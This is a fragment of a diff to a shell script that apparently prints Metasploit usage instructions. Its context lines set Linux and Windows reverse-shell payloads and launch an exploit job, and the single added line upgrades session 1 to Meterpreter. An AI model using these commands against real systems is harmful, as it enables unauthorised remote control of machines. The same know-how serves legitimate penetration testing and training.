@@ -51,6 +51,7 @@ echo "
      |  lin: set PAYLOAD linux/x86/shell/reverse_tcp
      |  win: set payload windows/shell/reverse_tcp
      |  exploit -j -z
+     |  sessions -u 1 
      "
 echo "==================================================================="
 echo "         once meterpreter is connected use the following
